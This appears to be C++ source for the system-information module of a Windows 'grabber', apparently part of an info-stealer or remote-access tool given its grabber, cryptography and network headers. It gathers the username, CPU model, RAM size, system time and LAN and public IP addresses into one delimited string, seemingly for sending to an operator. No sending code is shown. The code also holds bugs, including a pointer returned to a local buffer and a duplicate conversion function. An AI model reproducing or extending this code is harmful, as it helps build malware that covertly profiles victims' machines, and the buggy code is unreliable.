#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <lmcons.h>
#include <iostream>
#include <ctime>
#include <stdio.h>
#include <fstream>
#include <intrin.h> 
#include <string>
#include <sstream>
#include <array>
#include <random>
#include "cryptography.h"
#include "grabber.h"
#include "network.h"
using namespace std;

string GenerateId(int length)
{
    
    const string CHARACTERS
        = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuv"
        "wxyz0123456789";

    random_device rd;
    mt19937 generator(rd());
   
    uniform_int_distribution<> distribution(
        0, CHARACTERS.size() - 1);

    string random_string;
    for (int i = 0; i < length; ++i) {
        random_string
            += CHARACTERS[distribution(generator)];
    }

    return random_string;
}


TCHAR* GetUser()
{
	TCHAR name[UNLEN + 1];
	DWORD size = UNLEN + 1;

	GetUserName((TCHAR*)name, &size);
		
	return name;
}


string GetCpuInfo()
{
   
    array<int, 4> integerBuffer = {};
    constexpr size_t sizeofIntegerBuffer = sizeof(int) * integerBuffer.size();

    array<char, 64> charBuffer = {};

    constexpr std::array<int, 3> functionIds = {
        
        0x8000'0002,
     
        0x8000'0003,
      
        0x8000'0004
    };

    std::string cpu;

    for (int id : functionIds)
    {  
        __cpuid(integerBuffer.data(), id);
  
        std::memcpy(charBuffer.data(), integerBuffer.data(), sizeofIntegerBuffer);
   
        cpu += std::string(charBuffer.data());
    }

    return cpu;
}


float GetRamInfo()
{
    MEMORYSTATUSEX statex;

    statex.dwLength = sizeof(statex); 

    GlobalMemoryStatusEx(&statex);
   
    float memsize = (float)statex.ullTotalPhys / (1024 * 1024 * 1024);

    return memsize;

}

const string GetSysTime()
{
    time_t     now = time(0);
    struct tm  tstruct;
    char       buf[80];
    tstruct = *localtime(&now);
   
    strftime(buf, sizeof(buf), "%Y-%m-%d.%X", &tstruct);

    return buf;
}

string WStringToString(const wstring& wstr)
{
    string str;
    size_t size;
    str.resize(wstr.length());
    wcstombs_s(&size, &str[0], str.size() + 1, wstr.c_str(), wstr.size());
    return str;
}


string Grabber_Info()
{


	TCHAR* username = GetUser();


    wstring wstr_username = username;

    string str_computer_name = WStringToString(wstr_username);

	string cpu = GetCpuInfo();
	
	float ram = GetRamInfo();
	
	const string time = GetSysTime();


	string lan_ip = get_lan_ip();

	string public_ip = getIp();

    stringstream informations;

    informations << "Pc-name:" << str_computer_name << "||" << "Cpu:" << cpu << "||" << "Ram:" << ram << "||" << "System-time:" << time << "||" << "Lan-ip:" << lan_ip << "||" << "Public_ip:" << public_ip;

    string info = informations.str();

      
    info.erase(remove_if(info.begin(), info.end(), isspace), info.end());
   
    return info;
}

std::string WStringToString(const wstring wstr)
{
    return std::string();
}
